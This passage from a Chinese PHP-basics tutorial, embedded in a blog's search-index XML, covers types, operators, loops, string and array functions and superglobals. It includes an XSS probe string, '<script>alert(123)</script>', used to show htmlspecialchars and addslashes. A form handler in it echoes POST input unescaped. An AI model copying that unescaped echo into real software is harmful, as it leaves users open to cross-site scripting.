<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】基础知识整理</title>
    <url>/2021/07/18/%E3%80%90PHP%E3%80%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="变量基本类型测试代码"><a href="#变量基本类型测试代码" class="headerlink" title="变量基本类型测试代码"></a>变量基本类型测试代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//echo "Hello World!";</span></span><br><span class="line">	<span class="comment">#单行注释</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	多行注释</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">//phpinfo();</span></span><br><span class="line">	<span class="comment">//变量的写法</span></span><br><span class="line">	<span class="comment">//$变量名</span></span><br><span class="line">	<span class="comment">//print_r 输出数组</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//$a  = 10; //变量名区分大小写</span></span><br><span class="line">	<span class="comment">//$A = 20;</span></span><br><span class="line">	<span class="comment">//echo isset($a);</span></span><br><span class="line">	<span class="comment">// var_dump(isset($c));</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//gettype返回php类型</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	整型</span></span><br><span class="line"><span class="comment">	浮点型</span></span><br><span class="line"><span class="comment">	字符串</span></span><br><span class="line"><span class="comment">	布尔 bool</span></span><br><span class="line"><span class="comment">	数组 array</span></span><br><span class="line"><span class="comment">	NULL 空对象</span></span><br><span class="line"><span class="comment">	资源 resource</span></span><br><span class="line"><span class="comment">	对象 （面向对象）</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//测试</span></span><br><span class="line">	<span class="comment">//var_dump()是详细输出变量类型</span></span><br><span class="line"></span><br><span class="line">	$a = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//Integer整型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="number">1.2</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//double</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="string">"51"</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//string</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="keyword">false</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//boolean</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="string">"baidu"</span>,<span class="number">2.1</span>);<span class="comment">//索引数组</span></span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//array分为两种类型、索引数组、关联数组</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="keyword">NULL</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//NULL类型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="运算符测试代码"><a href="#运算符测试代码" class="headerlink" title="运算符测试代码"></a>运算符测试代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$num1 = <span class="number">10</span>;</span><br><span class="line">	$num2 = <span class="number">20</span>; <span class="comment">//除数不能为零</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//加减乘除</span></span><br><span class="line">	$a1 = $num1 + $num2;</span><br><span class="line">	$a2 = $num1 - $num2;</span><br><span class="line">	$a3 = $num1 * $num2;</span><br><span class="line">	$a4 = $num1 / $num2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $a1;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a2;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a3;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a4;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$a1 = <span class="number">9</span>;</span><br><span class="line">	$a2 = <span class="number">4</span>;</span><br><span class="line">	$a3 = $a1 % $a2; <span class="comment">//取余</span></span><br><span class="line">	<span class="keyword">echo</span> $a3;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ++ --</span></span><br><span class="line">	<span class="comment">//前++</span></span><br><span class="line">	<span class="comment">//后++</span></span><br><span class="line">	<span class="comment">//前--</span></span><br><span class="line">	<span class="comment">//后--</span></span><br><span class="line">	$a = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a++;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> ++$a;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//比较运算符</span></span><br><span class="line">	<span class="comment">//&gt; &gt;= &lt; &lt;= != == === !==</span></span><br><span class="line">	<span class="comment">//返回值boolean</span></span><br><span class="line">	</span><br><span class="line">	$a = <span class="number">10</span>;</span><br><span class="line">	$b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	var_dump($a!=$b); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="string">"10"</span>; <span class="comment">//string</span></span><br><span class="line">	$b = <span class="number">10</span>;   <span class="comment">//integer</span></span><br><span class="line">	var_dump($a!==$b); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//三元运算符 ? : </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="number">20</span>;</span><br><span class="line">	$b = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a&gt;$b?<span class="string">"Hellow"</span>:<span class="string">"Go"</span>; <span class="comment">//输出Hellow</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//&amp;&amp; || ! 与或非</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="keyword">false</span>;</span><br><span class="line">	$b = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">	var_dump(!$b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符串运算符.</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="string">"gylq."</span>;</span><br><span class="line">	$b = <span class="string">"github.io"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $a.$b; <span class="comment">//.起连接作用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="控制结构测试"><a href="#控制结构测试" class="headerlink" title="控制结构测试"></a>控制结构测试</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	$a = <span class="number">30</span>;</span><br><span class="line">	$b = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//php控制结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//if - else</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if ($a &gt; 5) &#123;</span></span><br><span class="line"><span class="comment">// 	// code...</span></span><br><span class="line"><span class="comment">// 	echo $a;</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">// 	echo "xxx";</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// echo "&lt;hr/&gt;"  //下划线</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// switch</span></span><br><span class="line"><span class="comment">// 整型、字符串</span></span><br><span class="line"><span class="comment">// switch ($a) &#123;</span></span><br><span class="line"><span class="comment">// 	case 1:</span></span><br><span class="line"><span class="comment">// 		echo "a=1";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// 	case 2:</span></span><br><span class="line"><span class="comment">// 		echo "a=2";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// 	case 3:</span></span><br><span class="line"><span class="comment">// 		echo "a=3";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// 	default:</span></span><br><span class="line"><span class="comment">// 		echo "a=?";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//循环结构</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//while</span></span><br><span class="line">	<span class="comment">// while ($a &lt; $b) &#123;</span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo "a=$a,b=$b"."&lt;br/&gt;";</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 	$a++;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// for ($i=0; $i &lt; 10; $i++) &#123; </span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo $i."&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//do-while</span></span><br><span class="line">	<span class="comment">// do &#123;</span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo "a=$a,b=$b"."&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	$a--;</span></span><br><span class="line">	<span class="comment">// &#125; while ($a &gt; $b);</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">1</span>; $i &lt; <span class="number">10</span>; $i++) &#123; </span><br><span class="line">		<span class="comment">// code...</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>($i == <span class="number">5</span>)</span><br><span class="line">			<span class="keyword">continue</span>;  <span class="comment">//break是跳出整个循环，continue是跳出本次循环</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"i=$i&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="字符串函数使用"><a href="#字符串函数使用" class="headerlink" title="字符串函数使用"></a>字符串函数使用</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="string">"baidu"</span>;</span><br><span class="line">	$b = <span class="string">"taobao"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// $c = 'xxxx$a\txxxx';</span></span><br><span class="line">	<span class="comment">// $d = "xxxx$a\txxxx"; //双引号是解释变量，单引号不解释</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo "c=".$c."&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// echo "d=".$d."&lt;br/&gt;";</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符串的常用函数</span></span><br><span class="line">	header(<span class="string">"Content-type:text/html;charset=utf-8"</span>); <span class="comment">//解码</span></span><br><span class="line">	$a = <span class="string">"gylq.gitgylqhub.io.baidu.com.cn.baidu.com.cn"</span>;</span><br><span class="line">	$b = <span class="string">"背景"</span>; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//strlen（返回字节长度）</span></span><br><span class="line">	<span class="comment">// echo strlen($b)."&lt;br/&gt;";//一个汉字占3个字节.返回字节长度  </span></span><br><span class="line">	<span class="comment">// echo $b; //</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//mb_strlen（返回解码长度的真实）</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"a mb_strlen = "</span>.mb_strlen($a,<span class="string">"utf-8"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"b mb_strlen = "</span>.mb_strlen($b,<span class="string">"utf-8"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//strpos  返回字符串第一次出现的位置</span></span><br><span class="line">	<span class="keyword">echo</span> strpos($a, <span class="string">'gi'</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//stripos（返回字符串第一次出现的位置不区分大小写）</span></span><br><span class="line">	<span class="keyword">echo</span> stripos($a,<span class="string">'Gi'</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//strrpos（从右边开始数）</span></span><br><span class="line">	<span class="keyword">echo</span> strrpos(<span class="string">"You love php, I love php too!"</span>,<span class="string">"php"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//str_replace(替换函数) str_ireplace就是不区分大小写</span></span><br><span class="line">	$c = str_replace(gylq, baidu, $a);</span><br><span class="line">	<span class="keyword">echo</span> $c.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//strstr 查找字符串首次出现位置 stristr(不区分大小写)</span></span><br><span class="line">	<span class="keyword">echo</span> strstr($a,<span class="string">"g"</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//substr 截取字符串 strrchr(从右边截取)</span></span><br><span class="line">	<span class="comment">//strrchr 如果needle包含了不止一个字符，那么仅使用第一个字符。该行为不同于strstr()。</span></span><br><span class="line">	<span class="comment">//strrchr 如果needle不是一个字符串，那么将被转化为整型并被视为字符顺序值。</span></span><br><span class="line">	<span class="keyword">echo</span> substr($a, <span class="number">5</span>,<span class="number">10</span>).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> strrchr($a, <span class="string">"b"</span>).<span class="string">"&lt;br/&gt;"</span>; <span class="comment">//取文件后缀名会用到</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//split 正则分割 explode 字符串分割成数组  implode 数组转化为字符串</span></span><br><span class="line">	$website = <span class="string">"gylq.github.io"</span>;</span><br><span class="line">	$arrstr = explode(<span class="string">"."</span>, $website);</span><br><span class="line">	print_r($arrstr);</span><br><span class="line">	$newsite = implode($arrstr,<span class="string">"."</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.$newsite; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//trim 去除首位的空格符 ltrim左边空格 rtrim右边空格</span></span><br><span class="line">	$user = <span class="string">"    userxxx     "</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.trim($user).<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>.$user.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//addslashes 自动过滤点引号变转义</span></span><br><span class="line">	<span class="comment">//htmlspecialchars</span></span><br><span class="line"></span><br><span class="line">	$xss = <span class="string">"&lt;script&gt;alert(123)&lt;/script&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> htmlspecialchars($xss);</span><br><span class="line">	<span class="keyword">echo</span> addslashes($xss);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="数组的一些操作"><a href="#数组的一些操作" class="headerlink" title="数组的一些操作"></a>数组的一些操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = <span class="string">"aaaa"</span>;</span><br><span class="line">	$b = <span class="number">123</span>;</span><br><span class="line"></span><br><span class="line">	 $arr = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"baidu"</span>,<span class="string">"shaghai"</span>); <span class="comment">//索引数组</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//print_r输出数组</span></span><br><span class="line">	<span class="comment">//count输出数组大小</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	 foreach ($arr as $key =&gt; $value) &#123;</span></span><br><span class="line"><span class="comment">	 	// code...</span></span><br><span class="line"><span class="comment">	 	echo $key,"----".$value."&lt;br/&gt;";</span></span><br><span class="line"><span class="comment">	 &#125;</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $arr1 = array(</span></span><br><span class="line">	<span class="comment">// 		"aa"=&gt;"wuhan",</span></span><br><span class="line">	<span class="comment">// 		"bb"=&gt;10,</span></span><br><span class="line">	<span class="comment">// 		"cc"=&gt;"beijing"</span></span><br><span class="line">	<span class="comment">// );  // 关键型数组</span></span><br><span class="line">	<span class="comment">// foreach ($arr1 as $key =&gt; $value) &#123;</span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo $key,"----".$value."&lt;br/&gt;"; </span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//数组的增删改查</span></span><br><span class="line">	 <span class="comment">// $arr = array("a","vv","cc");</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// $arr[] = "ff"; //增</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// unset($arr[1]); //删</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// $arr[2]="gylq.github"; //改</span></span><br><span class="line">	 <span class="comment">// print_r($arr);</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">//each</span></span><br><span class="line">	 <span class="comment">//list  数组遍历</span></span><br><span class="line">	 <span class="comment">// while ($row = each($arr)) &#123;</span></span><br><span class="line">	 <span class="comment">// 	// code...</span></span><br><span class="line">	 <span class="comment">// 	list($k,$v) = $row;</span></span><br><span class="line">	 <span class="comment">// 	echo $k."---".$v."&lt;br/&gt;";</span></span><br><span class="line">	 <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">//array_key_exists() 判断键值是否存在</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// $arr = array(</span></span><br><span class="line">	 <span class="comment">// 		"a"=&gt;"xxx",</span></span><br><span class="line">	 <span class="comment">// 		"b"=&gt;"xada",</span></span><br><span class="line">	 <span class="comment">// 		"c"=&gt;"777"</span></span><br><span class="line">	 <span class="comment">// );</span></span><br><span class="line"></span><br><span class="line">	 <span class="comment">// var_dump(array_key_exists("a", $arr));</span></span><br><span class="line">	 <span class="comment">// var_dump(in_array("777", $arr));</span></span><br><span class="line">	 <span class="comment">// var_dump(array_keys($arr));</span></span><br><span class="line"></span><br><span class="line">	 <span class="keyword">for</span>($i = <span class="number">1</span> ; $i&lt;<span class="number">10</span>; $i++)</span><br><span class="line">	 &#123;</span><br><span class="line">	 	<span class="keyword">for</span>($j = <span class="number">1</span>; $j&lt;= $i; $j++)</span><br><span class="line">	 	&#123;</span><br><span class="line">	 		<span class="keyword">echo</span> $j.<span class="string">"*"</span>.$i.<span class="string">"="</span>.($j*$i).<span class="string">"&amp;nbsp;&amp;nbsp "</span>;</span><br><span class="line">	 	&#125;</span><br><span class="line"></span><br><span class="line">	 	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="超全局变量的一些操作"><a href="#超全局变量的一些操作" class="headerlink" title="超全局变量的一些操作"></a>超全局变量的一些操作</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">	&lt;title&gt;POST&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"1.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">	用户：&lt;input type=<span class="string">"text"</span> name=<span class="string">"a1"</span>&gt;&lt;br/&gt;</span><br><span class="line">	密码：&lt;input type=<span class="string">"text"</span> name=<span class="string">"b1"</span>&gt;&lt;br/&gt;</span><br><span class="line">	&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// // 无参函数</span></span><br><span class="line">	<span class="comment">// function a()&#123;</span></span><br><span class="line">	<span class="comment">// 	echo "gylq.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "123.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "312.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "gy222.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	echo "gy21lq.github.io&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //调用函数</span></span><br><span class="line">	<span class="comment">// //a();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// //有参函数</span></span><br><span class="line">	<span class="comment">// function b($a, $c)&#123;</span></span><br><span class="line">	<span class="comment">// 	$x = $a * $a + $c * $c;</span></span><br><span class="line">	<span class="comment">// 	return $x;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $y = b(3,4);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo $y;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//超全局变量</span></span><br><span class="line">	<span class="comment">//GLOBALS 超全局数组</span></span><br><span class="line">	$y = <span class="string">"www.baidu.com"</span>;</span><br><span class="line">	<span class="comment">//var_dump($GLOBALS);</span></span><br><span class="line">	<span class="comment">//echo $y;</span></span><br><span class="line">	<span class="comment">// echo $GLOBALS['GLOBALS']["y"];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//var_dump($_SERVER);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo $_SERVER["REMOTE_ADDR"];</span></span><br><span class="line">	<span class="comment">// echo "&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// echo $_SERVER["HTTP_USER_AGENT"];</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//GET测试</span></span><br><span class="line">	<span class="comment">// function getAdd($a,$b)&#123;</span></span><br><span class="line">	<span class="comment">// 	return $a+$b;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// if(empty($_GET))&#123;</span></span><br><span class="line">	<span class="comment">// 	echo "no get&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// &#125;else&#123;</span></span><br><span class="line">	<span class="comment">// 	$x = $_GET["a"];</span></span><br><span class="line">	<span class="comment">// 	$y = $_GET["b"];</span></span><br><span class="line">	<span class="comment">// 	$c = getAdd($x,$y);</span></span><br><span class="line">	<span class="comment">// 	echo $c;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//GET测试</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getAdd</span><span class="params">($a,$b)</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> $a+$b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($_GET))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"no get&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$x = $_GET[<span class="string">"a"</span>];</span><br><span class="line">		$y = $_GET[<span class="string">"b"</span>];</span><br><span class="line">		$c = getAdd($x,$y);</span><br><span class="line">		<span class="keyword">echo</span> $c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($_POST))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"no post&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$a = $_POST[<span class="string">"a1"</span>];</span><br><span class="line">		$b = $_POST[<span class="string">"b1"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"$a -- $b &lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//$_REQUEST = $_GET + $_POST</span></span><br><span class="line"></span><br><span class="line">	var_dump($_REQUEST);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="PHP的变量与作用"><a href="#PHP的变量与作用" class="headerlink" title="PHP的变量与作用"></a>PHP的变量与作用</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	define(<span class="string">"PI"</span>,<span class="number">3.14</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo PI;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// var_dump(defined("PI")); //检测是否定义过</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//全局变量</span></span><br><span class="line">	<span class="comment">//局部变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line">	<span class="comment">// echo "aaa";</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// $str = "www.x.com";</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">		$x = $x + <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"function a :"</span>.$x.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">b</span><span class="params">(&amp;$x)</span></span>&#123;</span><br><span class="line">		$x = $x + <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"function b :"</span>.$x.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">c</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $aa;</span><br><span class="line"></span><br><span class="line">		$x = $x * <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"function c: $x &lt;br/&gt;"</span>;</span><br><span class="line">		$aa++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$aa = <span 